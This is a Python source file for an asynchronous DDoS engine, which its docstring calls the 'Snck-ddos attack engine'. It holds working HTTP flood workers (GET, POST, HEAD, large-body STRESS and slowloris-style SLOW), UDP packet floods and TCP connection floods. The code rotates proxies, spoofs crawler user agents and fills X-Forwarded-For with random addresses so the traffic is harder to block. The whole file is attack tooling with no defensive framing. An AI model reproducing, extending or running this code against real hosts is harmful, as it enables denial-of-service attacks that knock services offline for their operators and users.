# language: Python 3.11+, file: core/engine.py, target: Linux / Windows
"""Snck-ddos attack engine — async workers + proxy rotation + multi-method."""

from __future__ import annotations

import asyncio
import random
import socket
import struct
import time
from dataclasses import dataclass, field
from typing import Any, Callable, Optional

import aiohttp
from aiohttp import ClientSession, TCPConnector

try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
except ImportError:
    pass


USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
]


@dataclass
class AttackStats:
    started: float = field(default_factory=time.time)
    requests: int = 0
    bytes_sent: int = 0
    errors: int = 0
    active_workers: int = 0
    running: bool = False
    method: str = ""
    target: str = ""
    threads: int = 0

    def rps(self) -> float:
        elapsed = max(time.time() - self.started, 0.001)
        return self.requests / elapsed

    def mbps(self) -> float:
        elapsed = max(time.time() - self.started, 0.001)
        return (self.bytes_sent * 8) / elapsed / 1_000_000


@dataclass
class AttackConfig:
    target: str
    method: str = "GET"
    threads: int = 200
    duration: int = 60
    proxies: list[str] = field(default_factory=list)
    payload_size: int = 1024
    rate_limit: int = 0  # 0 = unlimited


class Engine:
    def __init__(self) -> None:
        self.stats = AttackStats()
        self._tasks: list[asyncio.Task] = []
        self._stop = asyncio.Event()
        self._lock = asyncio.Lock()
        self._proxy_idx = 0

    def _next_proxy(self, proxies: list[str]) -> Optional[str]:
        if not proxies:
            return None
        p = proxies[self._proxy_idx % len(proxies)]
        self._proxy_idx += 1
        return p

    async def _l7_worker(
        self,
        session: ClientSession,
        cfg: AttackConfig,
        headers_base: dict[str, str],
    ) -> None:
        self.stats.active_workers += 1
        body = b"A" * cfg.payload_size if cfg.method in ("POST", "STRESS") else None
        try:
            while not self._stop.is_set():
                proxy = self._next_proxy(cfg.proxies)
                headers = dict(headers_base)
                headers["User-Agent"] = random.choice(USER_AGENTS)
                headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
                headers["Cache-Control"] = "no-cache"
                try:
                    if cfg.method == "GET":
                        async with session.get(cfg.target, headers=headers, proxy=proxy, ssl=False) as resp:
                            data = await resp.read()
                            async with self._lock:
                                self.stats.requests += 1
                                self.stats.bytes_sent += len(data) + 200
                    elif cfg.method == "POST":
                        async with session.post(cfg.target, data=body, headers=headers, proxy=proxy, ssl=False) as resp:
                            data = await resp.read()
                            async with self._lock:
                                self.stats.requests += 1
                                self.stats.bytes_sent += len(body or b"") + len(data)
                    elif cfg.method == "HEAD":
                        async with session.head(cfg.target, headers=headers, proxy=proxy, ssl=False) as resp:
                            async with self._lock:
                                self.stats.requests += 1
                                self.stats.bytes_sent += 150
                    elif cfg.method == "STRESS":
                        big = body or (b"X" * 8192)
                        async with session.post(cfg.target, data=big, headers=headers, proxy=proxy, ssl=False) as resp:
                            data = await resp.read()
                            async with self._lock:
                                self.stats.requests += 1
                                self.stats.bytes_sent += len(big) + len(data)
                    elif cfg.method == "SLOW":
                        async with session.get(cfg.target, headers=headers, proxy=proxy, ssl=False, timeout=aiohttp.ClientTimeout(total=30)) as resp:
                            async with self._lock:
                                self.stats.requests += 1
                                self.stats.bytes_sent += 100
                            await asyncio.sleep(random.uniform(5, 15))
                    else:
                        async with session.get(cfg.target, headers=headers, proxy=proxy, ssl=False) as resp:
                            data = await resp.read()
                            async with self._lock:
                                self.stats.requests += 1
                                self.stats.bytes_sent += len(data)
                except Exception:
                    async with self._lock:
                        self.stats.errors += 1
                if cfg.rate_limit > 0:
                    await asyncio.sleep(1.0 / max(cfg.rate_limit / cfg.threads, 0.001))
        finally:
            self.stats.active_workers -= 1

    async def _udp_worker(self, cfg: AttackConfig) -> None:
        self.stats.active_workers += 1
        try:
            host = cfg.target.split("://")[-1].split("/")[0].split(":")[0]
            port = 80
            if ":" in cfg.target.split("://")[-1].split("/")[0]:
                try:
                    port = int(cfg.target.split("://")[-1].split("/")[0].split(":")[1])
                except Exception:
                    port = 80
            try:
                ip = socket.gethostbyname(host)
            except Exception:
                ip = host
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
            payload = random.randbytes(cfg.payload_size)
            while not self._stop.is_set():
                try:
                    sent = sock.sendto(payload, (ip, port))
                    async with self._lock:
                        self.stats.requests += 1
                        self.stats.bytes_sent += sent
                except Exception:
                    async with self._lock:
                        self.stats.errors += 1
                await asyncio.sleep(0)
        finally:
            try:
                sock.close()
            except Exception:
                pass
            self.stats.active_workers -= 1

    async def _tcp_worker(self, cfg: AttackConfig) -> None:
        self.stats.active_workers += 1
        try:
            host = cfg.target.split("://")[-1].split("/")[0].split(":")[0]
            port = 80
            if ":" in cfg.target.split("://")[-1].split("/")[0]:
                try:
                    port = int(cfg.target.split("://")[-1].split("/")[0].split(":")[1])
                except Exception:
                    port = 80
            payload = random.randbytes(min(cfg.payload_size, 1400))
            while not self._stop.is_set():
                try:
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(host, port), timeout=3.0
                    )
                    writer.write(payload)
                    await writer.drain()
                    writer.close()
                    try:
                        await writer.wait_closed()
                    except Exception:
                        pass
                    async with self._lock:
                        self.stats.requests += 1
                        self.stats.bytes_sent += len(payload)
                except Exception:
                    async with self._lock:
                        self.stats.errors += 1
                await asyncio.sleep(0)
        finally:
            self.stats.active_workers -= 1

    async def start(self, cfg: AttackConfig) -> None:
        if self.stats.running:
            return
        self._stop.clear()
        self.stats = AttackStats(
            running=True,
            method=cfg.method,
            target=cfg.target,
            threads=cfg.threads,
        )
        self._tasks.clear()

        method = cfg.method.upper()
        if method in ("UDP",):
            for _ in range(cfg.threads):
                t = asyncio.create_task(self._udp_worker(cfg))
                self._tasks.append(t)
        elif method in ("TCP", "SYN"):
            for _ in range(cfg.threads):
                t = asyncio.create_task(self._tcp_worker(cfg))
                self._tasks.append(t)
        else:
            connector = TCPConnector(
                limit=0,
                limit_per_host=0,
                ttl_dns_cache=300,
                force_close=False,
                enable_cleanup_closed=True,
                ssl=False,
            )
            timeout = aiohttp.ClientTimeout(total=8, connect=4)
            headers = {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "keep-alive",
            }
            session = ClientSession(connector=connector, timeout=timeout, headers=headers)
            for _ in range(cfg.threads):
                t = asyncio.create_task(self._l7_worker(session, cfg, headers))
                self._tasks.append(t)

            async def _timer():
                await asyncio.sleep(cfg.duration)
                await self.stop()
                await session.close()

            self._tasks.append(asyncio.create_task(_timer()))
            return

        async def _timer():
            await asyncio.sleep(cfg.duration)
            await self.stop()

        self._tasks.append(asyncio.create_task(_timer()))

    async def stop(self) -> None:
        self._stop.set()
        self.stats.running = False
        for t in self._tasks:
            t.cancel()
        await asyncio.gather(*self._tasks, return_exceptions=True)
        self._tasks.clear()
        self.stats.active_workers = 0


# singleton used by the web layer
engine = Engine()
